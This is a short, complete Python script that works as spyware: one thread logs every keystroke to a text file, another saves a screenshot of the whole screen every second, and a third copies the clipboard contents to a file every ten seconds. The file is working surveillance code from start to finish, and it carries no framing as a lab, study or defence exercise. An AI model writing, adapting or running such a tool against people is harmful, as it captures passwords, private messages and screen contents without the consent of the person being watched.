from pynput import keyboard
from PIL import ImageGrab
import time
import pyperclip
import os
import threading

# File where keystrokes will be saved
log_file = "log.txt"

# Function to record keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as f:
            # If key is a letter or number, write it normally
            if hasattr(key, 'char') and key.char is not None:
                f.write(key.char)
            else:
                f.write(f" [{key}] ")
    except Exception as e:
        print(f"Error: {e}")

# Function to start keylogger
def start_keylogger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Screenshot folder
screenshot_folder = "screenshots"

# Create folder if it doesn't exist
if not os.path.exists(screenshot_folder):
    os.makedirs(screenshot_folder)

# Function to take screenshots
def capture_screenshots():
    screenshot_number = 1
    while True:
        screenshot_path = os.path.join(screenshot_folder, f"{screenshot_number}.png")
        screenshot = ImageGrab.grab()
        screenshot.save(screenshot_path)
        screenshot_number += 1
        time.sleep(1)  # Capture a screenshot every second

# Function to capture clipboard content
def capture_clipboard():
    while True:
        clipboard_content = pyperclip.paste()
        if clipboard_content:
            with open("clipboard.txt", "a") as f:
                f.write(clipboard_content + "\n")
        time.sleep(10)  # Check clipboard every 10 seconds

# Run each function in a separate thread
if __name__ == "__main__":
    threading.Thread(target=start_keylogger, daemon=True).start()
    threading.Thread(target=capture_screenshots, daemon=True).start()
    threading.Thread(target=capture_clipboard, daemon=True).start()

    # Keep the main thread alive
    while True:
        time.sleep(1)
